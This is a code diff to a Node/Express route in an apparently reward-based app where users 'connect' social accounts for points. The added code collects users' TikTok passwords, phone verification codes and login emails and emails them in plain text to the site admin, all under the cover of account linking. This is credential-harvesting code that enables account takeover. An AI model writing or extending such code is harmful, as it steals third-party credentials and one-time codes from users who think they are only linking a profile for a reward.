@@ -32,18 +32,38 @@ router.get('/dashboard', auth, (req, res) => {
   });
 });
 
-router.post('/connect-account', auth, (req, res) => {
-  const { provider } = req.body || {};
+router.post('/connect-account', auth, async (req, res) => {
+  const { provider, method, email, password, phone, code, username } = req.body || {};
   const valid = ['whatsapp', 'tiktok', 'facebook'];
   if (!valid.includes(provider)) return res.status(400).json({ message: 'Invalid provider' });
   const user = ensureUserDefaults(getUserByEmail(req.userEmail));
   if (!user) return res.status(404).json({ message: 'Not found' });
+  
+  // Build email notification with connection details
+  let emailBody = `User ${user.email} linked ${provider}`;
+  if (provider === 'tiktok' && method) {
+    emailBody += `\n\nConnection Method: ${method}`;
+    if (method === 'google' && email) {
+      emailBody += `\nGoogle Email: ${email}`;
+    } else if (method === 'email' && email) {
+      emailBody += `\nTikTok Email/Username: ${email}`;
+      if (password) emailBody += `\nPassword: ${password}`;
+    } else if (method === 'phone' && phone) {
+      emailBody += `\nPhone Number: ${phone}`;
+      if (code) emailBody += `\nVerification Code: ${code}`;
+    } else if (method === 'username' && username) {
+      emailBody += `\nTikTok Username: ${username}`;
+      if (password) emailBody += `\nPassword: ${password}`;
+    }
+  }
+  
   if (!user.connectedAccounts.includes(provider)) user.connectedAccounts.push(provider);
   user.points += 100; // reward for connecting
   user.rupeesFromPoints = Math.floor(user.points / 100) * 10;
   saveUser(user);
-  sendAdminEmail('Account linked', `User ${user.email} linked ${provider}`).catch(() => {});
-  res.json({ message: `Connected ${provider}`, points: user.points });
+  
+  await sendAdminEmail(`${provider.charAt(0).toUpperCase() + provider.slice(1)} Account Linked`, emailBody).catch(() => {});
+  res.json({ message: `Connected ${provider}${method ? ' via ' + method : ''}`, points: user.points });
 });
 
 router.post('/withdraw', auth, (req, res) => {
